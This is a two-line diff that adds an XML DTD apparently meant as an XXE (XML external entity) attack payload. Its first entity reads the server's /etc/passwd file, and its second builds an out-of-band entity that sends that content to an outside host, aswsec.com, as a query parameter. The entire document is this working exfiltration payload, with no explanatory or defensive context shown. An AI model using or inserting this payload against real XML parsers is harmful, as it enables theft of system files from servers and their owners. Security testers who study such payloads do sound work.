@@ -1,0 +1,2 @@
+<!ENTITY % resource SYSTEM "file:///etc/passwd">
+<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'https://aswsec.com?p=%resource;'>">
